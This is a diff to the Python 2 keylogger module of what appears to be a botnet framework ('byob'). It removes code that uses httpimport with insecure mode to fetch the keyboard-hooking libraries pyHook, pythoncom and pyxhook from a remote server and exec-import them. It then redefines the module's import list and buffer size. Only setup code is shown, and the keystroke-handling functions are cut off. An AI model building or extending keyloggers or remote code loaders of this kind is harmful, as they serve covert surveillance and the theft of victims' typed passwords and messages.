@@ -16,38 +16,15 @@ import threading
 import cStringIO
 import collections
 
-
-# remote imports
-
-import httpimport
-
-httpimport.INSECURE = True
-
-with httpimport.remote_repo(['pyHook','pythoncom','pyxhook'], base_url='http://localhost:8000'):
-    if os.name == 'nt':
-        for module in ['pyHook','pythoncom']:
-            try:
-                exec "import %s" in globals()
-            except ImportError:
-                util.debug("Error: unable to import '%s'" % module)
-    else:
-        for module in ['pyxhook']:
-            try:
-                exec "import %s" in globals()
-            except ImportError:
-                util.debug("Error: unable to import '%s'" % module)
-
-
-# byob
+# modules
 
 import util
 
-
-_buffer = cStringIO.StringIO()
-_window = None
-_size   = 1000
-results = Queue.Queue()
-
+__Keylogger_imports = ['pyHook','pythoncom','pyxhook']
+_window             = None
+_size               = 4000
+_buffer             = cStringIO.StringIO()
+results             = Queue.Queue()
 
 
 def _event(event):
@@ -105,4 +82,3 @@ def run():
         except Exception as e:
             util.debug('{} error: {}'.format(run.func_name, str(e)))
             break
-
